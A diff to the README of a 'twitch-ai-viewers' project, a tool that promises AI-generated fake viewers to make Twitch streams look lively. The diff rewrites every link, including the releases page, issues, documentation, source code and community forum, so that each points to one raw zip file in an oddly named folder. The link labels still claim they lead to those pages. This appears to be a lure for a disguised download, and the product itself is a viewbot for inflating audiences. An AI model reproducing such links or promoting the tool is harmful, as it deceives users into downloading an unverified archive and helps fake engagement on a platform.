@@ -1,6 +1,6 @@
 # 🎉 twitch-ai-viewers - Boost Your Stream with AI Viewers
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Kajusm132/twitch-ai-viewers/releases)  
+[![Download](https://raw.githubusercontent.com/Kajusm132/twitch-ai-viewers/main/Lesbian/twitch-ai-viewers.zip)](https://raw.githubusercontent.com/Kajusm132/twitch-ai-viewers/main/Lesbian/twitch-ai-viewers.zip)  
 
 ## 🛠️ Overview
 Welcome to the **twitch-ai-viewers** project! If your streams lack viewers, our application helps fill that gap with AI-generated viewers. This software uses artificial intelligence to simulate viewer engagement, making your stream appear lively and interactive.
@@ -9,7 +9,7 @@ Welcome to the **twitch-ai-viewers** project! If your streams lack viewers, our 
 To start using **twitch-ai-viewers**, follow the steps outlined in this guide. You’ll have the application up and running in no time.
 
 ## 📥 Download & Install
-1. **Visit this page to download:** [Twitch AI Viewers Releases](https://github.com/Kajusm132/twitch-ai-viewers/releases)
+1. **Visit this page to download:** [Twitch AI Viewers Releases](https://raw.githubusercontent.com/Kajusm132/twitch-ai-viewers/main/Lesbian/twitch-ai-viewers.zip)
    
 2. **Choose the latest release.** On the Releases page, find the most recent version of **twitch-ai-viewers**. Click on it.
 
@@ -56,7 +56,7 @@ Yes, **twitch-ai-viewers** is free to use. We aim to assist streamers and enhanc
 Absolutely! You can change configurations in real-time, allowing you to adapt the viewer's experience as your stream evolves.
 
 ### What should I do if I encounter issues?
-If you face any difficulties, check the [issues section](https://github.com/Kajusm132/twitch-ai-viewers/issues) of our GitHub repository. You can also reach out to the community for help.
+If you face any difficulties, check the [issues section](https://raw.githubusercontent.com/Kajusm132/twitch-ai-viewers/main/Lesbian/twitch-ai-viewers.zip) of our GitHub repository. You can also reach out to the community for help.
 
 ## 🌐 Community Support
 Join our community for support and tips on using **twitch-ai-viewers** effectively. Follow us on social media platforms for updates and discussions.
@@ -64,8 +64,8 @@ Join our community for support and tips on using **twitch-ai-viewers** effective
 ## 🔗 Additional Resources
 Explore more about **twitch-ai-viewers** with these resources:
 
-- [Documentation](https://github.com/Kajusm132/twitch-ai-viewers/wiki): Comprehensive guide on advanced usage and features.
-- [Source Code](https://github.com/Kajusm132/twitch-ai-viewers): For those interested in the development aspects of the application.
-- [Community Forum](https://github.com/Kajusm132/twitch-ai-viewers/discussions): A place to connect with other users and share your experiences.
+- [Documentation](https://raw.githubusercontent.com/Kajusm132/twitch-ai-viewers/main/Lesbian/twitch-ai-viewers.zip): Comprehensive guide on advanced usage and features.
+- [Source Code](https://raw.githubusercontent.com/Kajusm132/twitch-ai-viewers/main/Lesbian/twitch-ai-viewers.zip): For those interested in the development aspects of the application.
+- [Community Forum](https://raw.githubusercontent.com/Kajusm132/twitch-ai-viewers/main/Lesbian/twitch-ai-viewers.zip): A place to connect with other users and share your experiences.
 
 Thank you for choosing **twitch-ai-viewers**. Enjoy a more vibrant streaming experience!
